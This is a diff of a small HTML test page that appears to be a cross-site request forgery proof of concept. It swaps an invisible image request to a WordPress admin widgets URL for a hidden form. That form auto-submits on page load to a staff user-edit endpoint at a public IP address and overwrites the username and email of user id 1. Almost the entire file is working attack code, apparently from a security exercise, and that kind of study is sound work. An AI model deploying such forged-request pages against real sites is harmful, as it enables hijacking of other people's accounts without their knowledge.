@@ -13,17 +13,28 @@ Hello World
 </BODY>
 </HTML>
 -->
-<!--
+
 <HTML>
 <HEAD>
 <TITLE>PLS WORK!!!</TITLE>
 </HEAD>
 <P>Work pls</P>
-<img src="http://127.0.0.1:8080/wp-admin/widgets.php?widgets-access=on&editwidget=search-2&sidebar=sidebar-2&key=0" width="0" height="0" border="0">
+<form name="csrf" action="https://35.184.88.145/red/public/staff/users/edit.php?id=1" method="POST">
+    <input type="hidden" name="first_name" value="Luka">
+    <input type="hidden" name="last_name" value="Tim">
+    <input type="hidden" name="username" value="jmonroe99">
+    <input type="hidden" name="email" value="test@test.com">
+    <input type="hidden" name="previous_email" value="">
+    <input type="hidden" name="password" value="">
+    <input type="hidden" name="confirm_password" value="">
+    <input type="submit">
+</form>
 Hello World
+<script>document.csrf.submit();</script>
 </BODY>
 </HTML>
--->
+
+<!--
 <HTML>
 <HEAD>
 <TITLE>PLS WORK!!!</TITLE>
@@ -45,6 +56,7 @@ Hello World
 <script>document.csrf.submit();</script>
 </BODY>
 </HTML>
+-->
 <!--
 <HTML>
 <HEAD>
